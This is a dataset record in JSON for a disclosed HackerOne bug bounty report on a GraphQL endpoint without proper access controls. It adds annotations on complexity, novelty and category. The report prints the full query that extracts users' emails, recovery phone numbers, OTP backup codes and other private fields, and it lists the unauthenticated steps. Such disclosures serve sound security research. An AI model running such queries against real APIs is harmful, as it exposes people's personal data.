@@ -1,0 +1,38 @@
+{
+    "reported_to": "HackerOne",
+    "reported_by": "yashrs ",
+    "title": "Confidential data of users and limited metadata of programs and reports accessible via GraphQL",
+    "content": "\nSummary:\nThe GraphQL endpoint doesn't have access controls implemented properly.\nDescription:\nAny attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.\nThese are just some examples of fields which are getting leaked directly from GraphQL.\nThis is the request sent to GraphQL:\nCode 801 Bytes\n1{\n2  id\n3  users()\n4  {\n5    total_count \n6    nodes\n7    {\n8      _id\n9      name\n10      username\n11      email\n12      account_recovery_phone_number\n13      account_recovery_unverified_phone_number\n14      bounties\n15      {\n16        total_amount\n17      }\n18      otp_backup_codes\n19      i_can_update_username\n20      location\n21      year_in_review_published_at\n22      anc_triager\n23      blacklisted_from_hacker_publish\n24      calendar_token\n25      vpn_credentials\n26      {\n27        name\n28      }\n29      account_recovery_phone_number_sent_at\n30      account_recovery_phone_number_verified_at\n31      swag\n32      {\n33        total_count\n34      }\n35      totp_enabled\n36      subscribed_for_team_messages\n37      subscribed_for_monthly_digest\n38      sessions\n39      {\n40        total_count\n41      }\n42      facebook_user_id\n43      unconfirmed_email\n44    }\n45  }\nSample Response:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPlease fix it.\nThanks,\nYash :)\nImpact\nThis could potentially leak many users' info\n\n",
+    "severity": [
+        9.3,
+        null
+    ],
+    "bounty": 20000,
+    "weaknesses": [
+        "Information Disclosure"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1549209420,
+    "report_url": "https://hackerone.com/reports/489146",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Access the GraphQL endpoint without authentication."
+        ],
+        [
+            2,
+            "Send a query requesting sensitive user fields such as email, account recovery phone number, backup codes, etc."
+        ]
+    ],
+    "vuln_description": "The GraphQL endpoint lacks proper access controls, allowing unauthenticated users to query sensitive personal information of Hackerone users, including email addresses, backup hash codes, phone numbers, and more.",
+    "reason": "The vulnerability involves a straightforward query to an unprotected GraphQL endpoint, with no need for complex interactions or state manipulation. The attack is simple and does not require understanding of multiple components or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
